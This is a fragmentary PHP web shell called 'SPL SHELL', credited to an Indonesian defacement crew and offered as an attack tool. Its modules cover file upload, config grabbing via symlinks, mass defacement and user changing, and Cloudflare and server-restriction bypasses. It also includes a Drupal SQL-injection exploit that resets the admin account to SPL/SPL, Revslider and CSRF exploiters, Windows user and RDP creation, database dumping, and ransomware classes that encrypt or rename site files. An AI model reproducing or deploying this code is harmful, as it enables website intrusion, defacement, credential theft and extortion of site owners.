	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				<title>SPL SHELL</title>
			<link rel="icon" href="https://1.bp.blogspot.com/-GW5Wm4OnvqU/XlzVbMuEkZI/AAAAAAAADgU/U5GlzmVLZUctV7phDci8NIh7CQX8YepQgCLcBGAsYHQ/s320/MyIcon2.png">
			<!-- <iframe width="1" height="1" src="https://www.youtube.com/embed/jxXEmucyLM8?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe> -->
...
.asu {
	background-color: #ccc;
				...
				<div class="container">
					<br><br>
					<div class="y x">
					<a href="?" class="ajx"><span style="color:cyan;font-family:HACKED;text-shadow:purple 0px 0px 10px">SPL SHELL</font></a>
					</div>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark ">
            ...
            <a class="navbar-brand" href="#">
                <img src="https://1.bp.blogspot.com/-GW5Wm4OnvqU/XlzVbMuEkZI/AAAAAAAADgU/U5GlzmVLZUctV7phDci8NIh7CQX8YepQgCLcBGAsYHQ/s320/MyIcon2.png" width="30" height="30" class="d-inline-block align-top auto" alt="SPL"> 
            </a>
            ...
            <div class="collapse navbar-collapse" id="navbarNav">
             ...
             <a class="navbar-brand" href="#">
                <img src="https://1.bp.blogspot.com/-GW5Wm4OnvqU/XlzVbMuEkZI/AAAAAAAADgU/U5GlzmVLZUctV7phDci8NIh7CQX8YepQgCLcBGAsYHQ/s320/MyIcon2.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe"> 
            </a>
            ...
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
				...
				<div class="u">
					...
					<form method="post" enctype="multipart/form-data">
						<label class="l w asu"><br>
							<input type="file" name="n[]" onchange="this.form.submit()" multiple class="form-control mr-3 asu">
						</label>&nbsp;
					</form>
	...
	MySQL : '.$mysql.' | MSSQL : '.$mssql.' | PostgreSQL : '.$PostgreSQL.' | Perl : '.$perl.' | Python : '.$python.' | Ruby : '.$ruby.' |  WGET : '.$wget.' | cURL : '.$curl.' | Magic Quotes : '.$magicquotes.' | SSH2 : '.$ssh2.' | Oracle : '.$oracle.' 
					...
					elseif (isset($_GET[hex('mass')])) {
						echo "<hr>
						<h2><center>Mass Tools SPL SHELL</center></h2>
						<br>
						<form method = 'POST'>
			...
			echo "<br><br><center><h2>Symlink SPL SHELL</h2></center><br><br><center><div class=content>";
...
';
 ...
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <h2><center>Symlink2 SPL SHELL</center></h2>
 <table align=center border=1><tr>
 ...
 echo "<center><font size=3>Cannot create Symlink</font></center>";
	...
	if($_POST){
		...
		echo "<hr><br><center>";
		echo "<h2>Config Grabber SPL SHELL</h2>";		
...
<?php 										
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files SPL SHELL</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		...
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>Hacked By SPL</textarea><br>
...
elseif (isset($_GET[hex('mass_user')])) {
	 	if($_POST['hajar']) {
				...
				print "<center>
				<h2>Mass User Changer SPL SHELL</h2>
				<form method='post'>
				...
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='SPL' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='SPL' placeholder='pass_baru'><br>
	 ...
	 elseif (isset($_GET[hex('mass_title')])) {
	 	echo "<hr><br><center><h2>Mass Title Changer SPL SHELL</h2>
<form method='post'>
Link Config: <br>
...
if($_POST['edittitle']) {
	 ...
	 elseif (isset($_GET[hex('bypass')])) {
							echo "<hr><br>";
							echo "<center><h2>Bypasser SPL SHELL</h2></center><br>";
	 ...
	 elseif (isset($_GET[hex('bypass-cf')])) {
				...
				<h2>Bypass CloudFlare SPL SHELL</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
...
<center/><br/><hr><h2>Bypass Server SPL SHELL</h2><br>
<?php
print'
...
echo "</h4></pre>";
 ...
 <?php
	...
	echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'form-control' style='width:250px;'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / SPL.txt');
			...
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","SPL.txt");
			$rt="<br><a href=SPL.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
...
echo"</textarea><br><br>";
					...
					elseif (isset($_GET[hex('exploiter')])) {
							echo "<hr><br>";
							echo "<center><h2>Exploiter SPL SHELL</h2></center><br>";
							echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
...
echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter SPL SHELL</h2><br><br>
...
<center><hr><br>
<h2>Revslider Exploiter SPL SHELL</h2>
<form method='post'>
   ...
   <input type='submit' value='drupal !' />
        ...
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'SPL' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
...
", 'content' => $post_data));
                ...
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    ...
                    fwrite($fp, "Exploitied  User: SPL Pass: SPL  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='lime'><b>Success:<font color='white'>SPL</font> Pass:<font color='white'>SPL</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
                } else {
...
echo '<hr><center><h2>Auto Tools SPL SHELL </h2><br>
...
<tr>
	<td><center><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("spl-ransom").'><center>SPL R4N50M3W4R3</center></a></td>
</table>
<br><hr>';
								}
...
<?php										
			...
			elseif (isset($_GET[hex('defacer-id')])) {
				...
				echo "<hr><br><center>
		<h2>Defacer ID Submit SPL SHELL</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='SPL'><br>
		<u>Team</u>: <br>
	...
	echo "<br>";
				...
				echo "<hr><br><center><h2>Jumping SPL SHELL</h2>";
	...
	if($_POST['reverse']) {
		...
		echo "<hr><br><center><h2>Fake Root SPL SHELL</h2><form method='post'>
		...
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
					...
					echo "<hr><br>";
					echo "<center><h2>Adminer SPL SHELL</h2>";
        ...
        if($_POST['create']) {
            ...
            if($_POST['opsi'] == '1') {
                ...
                $cek = exe("net user $user SPL");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>SPL</font>] -> ";
                    if($cek) {
        	...
        	echo "<hr><br><center>";
        	echo "<h2>RDP SPL SHELL</h2>";
            echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='SPL' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='SPL' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
...
<h2>Wordpress Hijack Index SPL SHELL</h2><br>
<center>
...
<input class='form-control' type='text' name='save' value='$dir/SPL_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
    ...
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/SPL_unzip' style='width: 450px;' height='10'><br><br>
    ...
    ";
        ...
        echo '</table><hr>';
			...
			elseif (isset($_GET[hex('spl-ransom')])) {
				?>
				<!DOCTYPE html>
<html>
<head>
   <title>SPL R4N50M3W4R3</title>
<style type="text/css">
body {
    background: #282828;
    color: #e2e2e2;
...
class deRanSomeware
{
   ...
   public function shcdirs($dir,$method,$key){
        ...
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                ...
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"SPL R4N50M3W4R3.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
   ...
   public function report($key){
        $message.= "=========     SPL R4N50M3W4R3    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= SPL (2020) R4N50M3W4R3 =========\n";
...
<?php
			...
			elseif (isset($_GET[hex('reverse-ip')])) {
					...
					?>
<br><hr>
<center><h2>Reverse IP SPL SHELL</h2>
...
<?php
			...
			elseif (isset($_GET[hex('ransomware')])) {
		 	...
		 	echo '<br><br><font color = red>Mohon Maaf Karena Tools Ransomware Hanya bisa berjalan di PHP versi 7.2 ke bawah saja . untuk PHP versi 7.2 ke atas masih tahap pembuatan </font> ';
		 	exit;
		 }
...
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
   <title> &#1203;&#824;&#1202;&#824;&#1203; SPL R4N5 TROJAN &#1203;&#824;&#1202;&#824;&#1203;</title>
<style type="text/css">
...
class deRanSomeware
{
   ...
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".TheSploit");
        break;
        case '2':
          $locates = str_replace(".TheSploit", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
...
<?php					
   ...
   echo '
    <br /><hr>
	<div class="mybox">
	<h2>Whois SPL SHELL</h2>
	<form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" style="color:black;background-color:#282828" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:black;background-color:#282828" name="scan" value="Scan !" /></td></tr>
   ...
   echo '</center>';
					...
					echo "<hr><br>";										
					echo '<center><h2>Mass Code Injector SPL SHELL</h2></center>';
...
<h2>Database Dumper SPL SHELL</h2>
<tr>
	<td>Server </td>
...
fclose($fp); 
		...
		echo '<table id="output"><tr bgcolor=#282828><td>Domains</td><td>users</td></tr>';
		foreach($d0mains as $d0main)
			{
...
echo "
<hr><br>
<br><center><h2>Whmcs Decoder SPL SHELL</h2></center>
...
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
	...
	echo"</td></tr></table>";								
				...
				elseif (isset($_GET[hex('scanner')])) {
					echo "<hr><br>";
							echo "<center><h2>Scanner SPL SHELL</h2></center><br>";
							echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
...
';
        ...
        echo "<center>";
        echo '<hr><br>
<h2>CMS Vulnerability Scanner SPL SHELL</h2>
<form method="POST" action=""  class="header-izz">
    ...
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
        ...
        if ($_POST) {
			...
			echo "<hr><br><center>";
		    echo '<table><h2>Ports Scanner SPL SHELL</h2><td>';
		    ...
		    echo '</div></table></td><hr><br>';
				...
				elseif (isset($_GET[hex('logs-scanner')])) {
					...
					echo '<hr><br>';
echo "<Center>\n"; 
echo "<h2>Log Hunter SPL SHELL</h2>";
echo "<form action=\"\" method=\"post\">\n"; 
...
echo "</div>";
				...
				echo "visit my blog : <a href = 'http://myamazingapk.blogspot.com/' target = 'blank' class= 'form-control' style = 'width:250px;'>MY BLOGGER!</a> <br>";
				echo "Visit my Website : <a href = 'http://tools.ezyro.com/' target = 'blank' class= 'form-control' style = 'width:250px;'>MY WEBSITE</a> <br>";
				echo "This is A Recode Shell : <br>
			    <br>
				";
				echo "Greetz : <br>All Defacer Indonesian";
				echo "<hr><br></center>";
			...
			<footer class="x">
			<center><font color="white">&copy; RECODED BY SPL  </center>
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
